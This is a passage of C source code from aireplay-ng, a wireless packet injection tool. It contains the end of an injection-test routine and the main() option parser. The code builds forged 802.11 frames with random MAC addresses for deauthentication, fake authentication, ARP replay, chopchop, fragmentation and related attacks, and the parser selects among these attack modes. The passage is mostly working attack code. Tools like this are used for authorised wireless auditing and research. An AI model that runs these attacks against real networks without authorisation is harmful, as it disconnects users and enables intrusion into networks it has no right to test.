tv.tv_usec));\n                            if(!answers)\n                            {\n                                if(opt.fast)\n                                {\n                                    PCT; printf(\"Injection is working!\\n\\n\");\n                                    return 0;\n                                }\n                                answers++;\n                            }\n                            ap[i].found++;\n                            if((signed)ri.ri_power > -200)\n                                ap[i].pwr[j] = (signed)ri.ri_power;\n                            break;\n                        }\n                    }\n                }\n\n                if (packet[0] == 0xC4 ) //Is clear-to-send\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        gettimeofday( &tv3, NULL);\n                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                        if(!answers)\n                        {\n                            if(opt.fast)\n                            {\n                                PCT; printf(\"Injection is working!\\n\\n\");\n                                return 0;\n                            }\n                            answers++;\n                        }\n                        ap[i].found++;\n                        if((signed)ri.ri_power > -200)\n                            ap[i].pwr[j] = (signed)ri.ri_power;\n                        break;\n                    }\n                }\n\n                if (packet[0] == 0xD4 ) //Is ack\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        gettimeofday( &tv3, NULL);\n                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                        if(!answers)\n                        {\n                            if(opt.fast)\n                            {\n                                PCT; printf(\"Injection is working!\\n\\n\");\n                                return 0;\n                            }\n                            answers++;\n                        }\n                        ap[i].found++;\n                        if((signed)ri.ri_power > -200)\n                            ap[i].pwr[j] = (signed)ri.ri_power;\n                        break;\n                    }\n                }\n\n                if (packet[0] == 0xB0 ) //Is auth response\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        if (! memcmp(packet+10, packet+16, 6)) //From BSS ID\n                        {\n                            gettimeofday( &tv3, NULL);\n                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));\n                            if(!answers)\n                            {\n                                if(opt.fast)\n                                {\n                                    PCT; printf(\"Injection is working!\\n\\n\");\n                                    return 0;\n                                }\n                                answers++;\n                            }\n                            ap[i].found++;\n                            if((signed)ri.ri_power > -200)\n                                ap[i].pwr[j] = (signed)ri.ri_power;\n                            break;\n                        }\n                    }\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (atime*1000)) //wait 'atime'ms for an answer\n                {\n                    break;\n                }\n                usleep(10);\n            }\n            printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n            fflush(stdout);\n        }\n        for(j=0; j<REQUESTS; j++)\n        {\n            if(ap[i].ping[j] > 0)\n            {\n                if(ap[i].ping[j] > max) max = ap[i].ping[j];\n                if(ap[i].ping[j] < min) min = ap[i].ping[j];\n                avg += ap[i].ping[j];\n                avg2 += ap[i].pwr[j];\n            }\n        }\n        if(ap[i].found > 0)\n        {\n            avg /= ap[i].found;\n            avg2 /= ap[i].found;\n            PCT; printf(\"Ping (min/avg/max): %.3fms/%.3fms/%.3fms Power: %.2f\\n\", (min/1000.0), (avg/1000.0), (max/1000.0), avg2);\n        }\n        PCT; printf(\"%2d/%2d: %3d%%\\n\\n\", ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));\n\n        if(!gotit && answers)\n        {\n            PCT; printf(\"Injection is working!\\n\\n\");\n            gotit=1;\n        }\n    }\n\n    if(opt.bittest)\n    {\n        if(found > 0)\n        {\n            PCT; printf(\"Trying directed probe requests for all bitrates...\\n\");\n        }\n\n        for(i=0; i<found; i++)\n        {\n            if(ap[i].found <= 0)\n                continue;\n            printf(\"\\n\");\n            PCT; printf(\"%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \\'%s\\'\\n\", ap[i].bssid[0], ap[i].bssid[1],\n                        ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);\n\n            min = INT_MAX;\n            max = 0;\n            avg = 0;\n\n            memcpy(h80211, PROBE_REQ, 24);\n\n            len = 24;\n\n            h80211[24] = 0x00;      //ESSID Tag Number\n            h80211[25] = ap[i].len; //ESSID Tag Length\n            memcpy(h80211+len+2, ap[i].essid, ap[i].len);\n\n            len += ap[i].len+2;\n\n            memcpy(h80211+len, RATES, 16);\n\n            len += 16;\n\n            for(k=0; k<RATE_NUM; k++)\n            {\n                ap[i].found=0;\n                if(set_bitrate(_wi_out, bitrates[k]))\n                    continue;\n\n\n                avg2 = 0;\n                memset(ap[i].pwr, 0, REQUESTS*sizeof(unsigned int));\n\n                for(j=0; j<REQUESTS; j++)\n                {\n                    /*\n                        random source so we can identify our packets\n                    */\n                    opt.r_smac[0] = 0x00;\n                    opt.r_smac[1] = rand() & 0xFF;\n                    opt.r_smac[2] = rand() & 0xFF;\n                    opt.r_smac[3] = rand() & 0xFF;\n                    opt.r_smac[4] = rand() & 0xFF;\n                    opt.r_smac[5] = rand() & 0xFF;\n\n                    memcpy(h80211+10, opt.r_smac, 6);\n\n                    send_packet(h80211, len);\n\n                    gettimeofday( &tv, NULL );\n\n                    printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n                    fflush(stdout);\n                    while (1)  //waiting for relayed packet\n                    {\n                        caplen = read_packet(packet, sizeof(packet), &ri);\n\n                        if (packet[0] == 0x50 ) //Is probe response\n                        {\n                            if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                            {\n                                if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP\n                                {\n                                    if(!answers)\n                                    {\n                                        answers++;\n                                    }\n                                    ap[i].found++;\n                                    if((signed)ri.ri_power > -200)\n                                        ap[i].pwr[j] = (signed)ri.ri_power;\n                                    break;\n                                }\n                            }\n                        }\n\n                        gettimeofday( &tv2, NULL );\n                        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000)) //wait 300ms for an answer\n                        {\n                            break;\n                        }\n                        usleep(10);\n                    }\n                    printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n                    fflush(stdout);\n                }\n                for(j=0; j<REQUESTS; j++)\n                    avg2 += ap[i].pwr[j];\n                if(ap[i].found > 0)\n                    avg2 /= ap[i].found;\n                PCT; printf(\"Probing at %2.1f Mbps:\\t%2d/%2d: %3d%%\\n\", wi_get_rate(_wi_out)/1000000.0,\n                            ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));\n            }\n\n            if(!gotit && answers)\n            {\n                PCT; printf(\"Injection is working!\\n\\n\");\n                if(opt.fast) return 0;\n                gotit=1;\n            }\n        }\n    }\n    if(opt.bittest)\n        set_bitrate(_wi_out, RATE_1M);\n\n    if( opt.s_face != NULL )\n    {\n        printf(\"\\n\");\n        PCT; printf(\"Trying card-to-card injection...\\n\");\n\n        /* sync both cards to the same channel, or the test will fail */\n        if(wi_get_channel(_wi_out) != wi_get_channel(_wi_in))\n        {\n            wi_set_channel(_wi_out, wi_get_channel(_wi_in));\n        }\n\n        /* Attacks */\n        for(i=0; i<5; i++)\n        {\n            k=0;\n            /* random macs */\n            opt.f_smac[0] = 0x00;\n            opt.f_smac[1] = rand() & 0xFF;\n            opt.f_smac[2] = rand() & 0xFF;\n            opt.f_smac[3] = rand() & 0xFF;\n            opt.f_smac[4] = rand() & 0xFF;\n            opt.f_smac[5] = rand() & 0xFF;\n\n            opt.f_dmac[0] = 0x00;\n            opt.f_dmac[1] = rand() & 0xFF;\n            opt.f_dmac[2] = rand() & 0xFF;\n            opt.f_dmac[3] = rand() & 0xFF;\n            opt.f_dmac[4] = rand() & 0xFF;\n            opt.f_dmac[5] = rand() & 0xFF;\n\n            opt.f_bssid[0] = 0x00;\n            opt.f_bssid[1] = rand() & 0xFF;\n            opt.f_bssid[2] = rand() & 0xFF;\n            opt.f_bssid[3] = rand() & 0xFF;\n            opt.f_bssid[4] = rand() & 0xFF;\n            opt.f_bssid[5] = rand() & 0xFF;\n\n            if(i==0) //attack -0\n            {\n                memcpy( h80211, DEAUTH_REQ, 26 );\n                memcpy( h80211 + 16, opt.f_bssid, 6 );\n                memcpy( h80211 +  4, opt.f_dmac,  6 );\n                memcpy( h80211 + 10, opt.f_smac, 6 );\n\n                opt.f_iswep = 0;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 26;\n            }\n            else if(i==1) //attack -1 (open)\n            {\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.f_dmac, 6 );\n                memcpy( h80211 + 10, opt.f_smac , 6 );\n                memcpy( h80211 + 16, opt.f_bssid, 6 );\n\n                opt.f_iswep = 0;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 30;\n            }\n            else if(i==2) //attack -1 (psk)\n            {\n                memcpy( h80211, ska_auth3, 24);\n                memcpy( h80211 +  4, opt.f_dmac, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_bssid, 6);\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<132; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = 1;\n                opt.f_tods = 0; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+132;\n            }\n            else if(i==3) //attack -3\n            {\n                memcpy( h80211, NULL_DATA, 24);\n                memcpy( h80211 +  4, opt.f_bssid, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_dmac, 6);\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<132; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = -1;\n                opt.f_tods = 1; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+132;\n            }\n            else if(i==4) //attack -5\n            {\n                memcpy( h80211, NULL_DATA, 24);\n                memcpy( h80211 +  4, opt.f_bssid, 6);\n                memcpy( h80211 + 10, opt.f_smac,  6);\n                memcpy( h80211 + 16, opt.f_dmac, 6);\n\n                h80211[1] |= 0x04;\n                h80211[22] = 0x0A;\n                h80211[23] = 0x00;\n\n                //iv+idx\n                h80211[24] = 0x86;\n                h80211[25] = 0xD8;\n                h80211[26] = 0x2E;\n                h80211[27] = 0x00;\n\n                //random bytes (as encrypted data)\n                for(j=0; j<7; j++)\n                    h80211[28+j] = rand() & 0xFF;\n\n                opt.f_iswep = -1;\n                opt.f_tods = 1; opt.f_fromds = 0;\n                opt.f_minlen = opt.f_maxlen = 24+4+7;\n            }\n\n            for(j=0; (j<(REQUESTS/4) && !k); j++) //try it 5 times\n            {\n                send_packet( h80211, opt.f_minlen );\n\n                gettimeofday( &tv, NULL );\n                while (1)  //waiting for relayed packet\n                {\n                    caplen = read_packet(packet, sizeof(packet), &ri);\n                    if ( filter_packet(packet, caplen) == 0 ) //got same length and same type\n                    {\n                        if(!answers)\n                        {\n                            answers++;\n                        }\n\n                        if(i == 0) //attack -0\n                        {\n                            if( h80211[0] == packet[0] )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==1) //attack -1 (open)\n                        {\n                            if( h80211[0] == packet[0] )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==2) //attack -1 (psk)\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==3) //attack -2/-3/-4/-6\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                                k=1;\n                                break;\n                            }\n                        }\n                        else if(i==4) //attack -5/-7\n                        {\n                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, caplen-24) == 0 )\n                            {\n                               if( (packet[1] & 0x04) && memcmp( h80211+22, packet+22, 2 ) == 0 )\n                               {\n                                    k=1;\n                                    break;\n                               }\n                            }\n                        }\n                    }\n\n                    gettimeofday( &tv2, NULL );\n                    if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 3*'atime' ms for an answer\n                    {\n                        break;\n                    }\n                    usleep(10);\n                }\n            }\n            if(k)\n            {\n                k=0;\n                if(i==0) //attack -0\n                {\n                    PCT; printf(\"Attack -0:           OK\\n\");\n                }\n                else if(i==1) //attack -1 (open)\n                {\n                    PCT; printf(\"Attack -1 (open):    OK\\n\");\n                }\n                else if(i==2) //attack -1 (psk)\n                {\n                    PCT; printf(\"Attack -1 (psk):     OK\\n\");\n                }\n                else if(i==3) //attack -3\n                {\n                    PCT; printf(\"Attack -2/-3/-4/-6:  OK\\n\");\n                }\n                else if(i==4) //attack -5\n                {\n                    PCT; printf(\"Attack -5/-7:        OK\\n\");\n                }\n            }\n            else\n            {\n                if(i==0) //attack -0\n                {\n                    PCT; printf(\"Attack -0:           Failed\\n\");\n                }\n                else if(i==1) //attack -1 (open)\n                {\n                    PCT; printf(\"Attack -1 (open):    Failed\\n\");\n                }\n                else if(i==2) //attack -1 (psk)\n                {\n                    PCT; printf(\"Attack -1 (psk):     Failed\\n\");\n                }\n                else if(i==3) //attack -3\n                {\n                    PCT; printf(\"Attack -2/-3/-4/-6:  Failed\\n\");\n                }\n                else if(i==4) //attack -5\n                {\n                    PCT; printf(\"Attack -5/-7:        Failed\\n\");\n                }\n            }\n        }\n\n        if(!gotit && answers)\n        {\n            PCT; printf(\"Injection is working!\\n\");\n            if(opt.fast) return 0;\n            gotit=1;\n        }\n    }\n    return 0;\n}\n\nint main( int argc, char *argv[] )\n{\n    int n, i, ret;\n\n    /* check the arguments */\n\n    memset( &opt, 0, sizeof( opt ) );\n    memset( &dev, 0, sizeof( dev ) );\n\n    opt.f_type    = -1; opt.f_subtype   = -1;\n    opt.f_minlen  = -1; opt.f_maxlen    = -1;\n    opt.f_tods    = -1; opt.f_fromds    = -1;\n    opt.f_iswep   = -1; opt.ringbuffer  =  8;\n\n    opt.a_mode    = -1; opt.r_fctrl     = -1;\n    opt.ghost     =  0;\n    opt.delay     = 15; opt.bittest     =  0;\n    opt.fast      =  0; opt.r_smac_set  =  0;\n    opt.npackets  =  1; opt.nodetect    =  0;\n    opt.rtc       =  1; opt.f_retry\t=  0;\n    opt.reassoc   =  0;\n\n/* XXX */\n#if 0\n#if defined(__FreeBSD__)\n    /*\n        check what is our FreeBSD version. injection works\n        only on 7-CURRENT so abort if it's a lower version.\n    */\n    if( __FreeBSD_version < 700000 )\n    {\n        fprintf( stderr, \"Aireplay-ng does not work on this \"\n            \"release of FreeBSD.\\n\" );\n        exit( 1 );\n    }\n#endif\n#endif\n\n    while( 1 )\n    {\n        int option_index = 0;\n\n        static struct option long_options[] = {\n            {\"deauth\",      1, 0, '0'},\n            {\"fakeauth\",    1, 0, '1'},\n            {\"interactive\", 0, 0, '2'},\n            {\"arpreplay\",   0, 0, '3'},\n            {\"chopchop\",    0, 0, '4'},\n            {\"fragment\",    0, 0, '5'},\n            {\"caffe-latte\", 0, 0, '6'},\n            {\"cfrag\",       0, 0, '7'},\n            {\"test\",        0, 0, '9'},\n            {\"help\",        0, 0, 'H'},\n            {\"fast\",        0, 0, 'F'},\n            {\"bittest\",     0, 0, 'B'},\n            {\"migmode\",     0, 0, '8'},\n            {\"ignore-negative-one\", 0, &opt.ignore_negative_one, 1},\n            {0,             0, 0,  0 }\n        };\n\n        int option = getopt_long( argc, argv,\n                        \"b:d:s:m:n:u:v:t:T:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:Q0:1:23456789HFBDR\",\n                        long_options, &option_index );\n\n        if( option < 0 ) break;\n\n        switch( option )\n        {\n            case 0 :\n\n                break;\n\n            case ':' :\n\n                printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                return( 1 );\n\n            case '?' :\n\n                printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                return( 1 );\n\n            case 'b' :\n\n                if( getmac( optarg, 1 ,opt.f_bssid ) != 0 )\n                {\n                    printf( \"Invalid BSSID (AP MAC address).\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'd' :\n\n                if( getmac( optarg, 1, opt.f_dmac ) != 0 )\n                {\n                    printf( \"Invalid destination MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 's' :\n\n                if( getmac( optarg, 1, opt.f_smac ) != 0 )\n                {\n                    printf( \"Invalid source MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'm' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_minlen );\n                if( opt.f_minlen < 0 || ret != 1 )\n                {\n                    printf( \"Invalid minimum length filter. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'n' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_maxlen );\n                if( opt.f_maxlen < 0 || ret != 1 )\n                {\n                    printf( \"Invalid maximum length filter. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'u' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_type );\n                if( opt.f_type < 0 || opt.f_type > 3 || ret != 1 )\n                {\n                    printf( \"Invalid type filter. [0-3]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'v' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_subtype );\n                if( opt.f_subtype < 0 || opt.f_subtype > 15 || ret != 1 )\n                {\n                    printf( \"Invalid subtype filter. [0-15]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'T' :\n\t\tret = sscanf(optarg, \"%d\", &opt.f_retry);\n\t\tif ((opt.f_retry < 1) || (opt.f_retry > 65535) || (ret != 1)) {\n\t\t\tprintf(\"Invalid retry setting. [1-65535]\\n\");\n\t\t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n\t\t\treturn(1);\n\t\t}\n\t\tbreak;\n\n            case 't' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_tods );\n                if(( opt.f_tods != 0 && opt.f_tods != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid tods filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'f' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_fromds );\n                if(( opt.f_fromds != 0 && opt.f_fromds != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid fromds filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'w' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_iswep );\n                if(( opt.f_iswep != 0 && opt.f_iswep != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid wep filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'x' :\n\n                ret = sscanf( optarg, \"%d\", &opt.r_nbpps );\n                if( opt.r_nbpps < 1 || opt.r_nbpps > 1024 || ret != 1 )\n                {\n                    printf( \"Invalid number of packets per second. [1-1024]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'o' :\n\n                ret = sscanf( optarg, \"%d\", &opt.npackets );\n                if( opt.npackets < 0 || opt.npackets > 512 || ret != 1 )\n                {\n                    printf( \"Invalid number of packets per burst. [0-512]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'q' :\n\n                ret = sscanf( optarg, \"%d\", &opt.delay );\n                if( opt.delay < 1 || opt.delay > 600 || ret != 1 )\n                {\n                    printf( \"Invalid number of seconds. [1-600]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'Q' :\n\n                opt.reassoc = 1;\n                break;\n\n            case 'p' :\n\n                ret = sscanf( optarg, \"%x\", &opt.r_fctrl );\n                if( opt.r_fctrl < 0 || opt.r_fctrl > 65535 || ret != 1 )\n                {\n                    printf( \"Invalid frame control word. [0-65535]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'a' :\n\n                if( getmac( optarg, 1, opt.r_bssid ) != 0 )\n                {\n                    printf( \"Invalid AP MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'c' :\n\n                if( getmac( optarg, 1, opt.r_dmac ) != 0 )\n                {\n                    printf( \"Invalid destination MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'g' :\n\n                ret = sscanf( optarg, \"%d\", &opt.ringbuffer );\n                if( opt.ringbuffer < 1 || ret != 1 )\n                {\n                    printf( \"Invalid replay ring buffer size. [>=1]\\n\");\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'h' :\n\n                if( getmac( optarg, 1, opt.r_smac ) != 0 )\n                {\n                    printf( \"Invalid source MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.r_smac_set=1;\n                break;\n\n            case 'e' :\n\n                memset(  opt.r_essid, 0, sizeof( opt.r_essid ) );\n                strncpy( opt.r_essid, optarg, sizeof( opt.r_essid )  - 1 );\n                break;\n\n            case 'j' :\n\n                opt.r_fromdsinj = 1;\n                break;\n\n            case 'D' :\n\n                opt.nodetect = 1;\n                break;\n\n            case 'k' :\n\n                inet_aton( optarg, (struct in_addr *) opt.r_dip );\n                break;\n\n            case 'l' :\n\n                inet_aton( optarg, (struct in_addr *) opt.r_sip );\n                break;\n\n            case 'y' :\n\n                if( opt.prga != NULL )\n                {\n                    printf( \"PRGA file already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                if( read_prga(&(opt.prga), optarg) != 0 )\n                {\n                    return( 1 );\n                }\n                break;\n\n            case 'i' :\n\n                if( opt.s_face != NULL || opt.s_file )\n                {\n                    printf( \"Packet source already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.s_face = optarg;\n                opt.port_in = get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in)-1);\n                break;\n\n            case 'r' :\n\n                if( opt.s_face != NULL || opt.s_file )\n                {\n                    printf( \"Packet source already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.s_file = optarg;\n                break;\n\n            case 'z' :\n\n                opt.ghost = 1;\n\n                break;\n\n            case '0' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 0;\n\n                for (i=0; optarg[i] != 0; i++)\n                {\n                    if (isdigit((int)optarg[i]) == 0)\n                        break;\n                }\n\n                ret = sscanf( optarg, \"%d\", &opt.a_count );\n                if( opt.a_count < 0 || optarg[i] != 0 || ret != 1)\n                {\n                    printf( \"Invalid deauthentication count or missing value. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case '1' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 1;\n\n                for (i=0; optarg[i] != 0; i++)\n                {\n                    if (isdigit((int)optarg[i]) == 0)\n                        break;\n                }\n\n                ret = sscanf( optarg, \"%d\", &opt.a_delay );\n                if( opt.a_delay < 0 || optarg[i] != 0 || ret != 1)\n                {\n                    printf( \"Invalid reauthentication delay or missing value. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case '2' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 2;\n                break;\n\n            case '3' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 3;\n                break;\n\n            case '4' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 4;\n                break;\n\n            case '5' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 5;\n                break;\n\n            case '6' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 6;\n                break;\n\n            case '7' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 7;\n                break;\n\n            case '9' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 9;\n                break;\n\n            case '8' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 8;\n                break;\n\n            case 'F' :\n\n                opt.fast = 1;\n                break;\n\n            case 'B' :\n\n                opt.bittest = 1;\n                break;\n\n            case 'H' :\n\n                printf( usage, getVersion(\"Aireplay-ng\", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );\n                return( 1 );\n\n            case 'R' :\n\n                opt.rtc = 0;\n                break;\n\n            default : goto usage;\n        }\n    }\n\n    if( argc - optind != 1 )\n    {\n    \tif(argc == 1)\n    \t{\nusage:\n\t        printf( usage, getVersion(\"Aireplay-ng\", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );\n        }\n\t    if( argc - optind == 0)\n\t    {\n\t    \tprintf(\"No replay interface specified.\\n\");\n\t    }\n\t    if(argc > 1)\n\t    {\n    \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n\t    }\n        return( 1 );\n    }\n\n    if( opt.a_mode == -1 )\n    {\n        printf( \"Please specify an attack mode.\\n\" );\n   \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n        return( 1 );\n    }\n\n    if( (opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen )\n    {\n        printf( \"Invalid length filter (min(-m):%d > max(-n):%d).\\n\",\n                opt.f_minlen, opt.f_maxlen );\n  \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n        return( 1 );\n    }\n\n    if ( opt.f_tods == 1 && opt.f_fromds == 1 )\n    {\n        printf( \"FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\\n\" );\n    }\n\n    dev.fd_rtc = -1;\n\n    /* open the RTC device if necessary */\n\n#if defined(__i386__)\n#if defined(linux)\n    if( opt.a_mode > 1 )\n    {\n        if( ( dev.fd_rtc = open( \"/dev/rtc0\", O_RDONLY ) ) < 0 )\n        {\n            dev.fd_rtc = 0;\n        }\n\n        if( (dev.fd_rtc == 0) && ( ( dev.fd_rtc = open( \"/dev/rtc\", O_RDONLY ) ) < 0 ) )\n        {\n            dev.fd_rtc = 0;\n        }\n        if(opt.rtc == 0)\n        {\n            dev.fd_rtc = -1;\n        }\n        if(dev.fd_rtc > 0)\n        {\n            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION ) < 0 )\n            {\n                perror( \"ioctl(RTC_IRQP_SET) failed\" );\n                printf(\n    \"Make sure enhanced rtc device support is enabled in the kernel (module\\n\"\n    \"rtc, 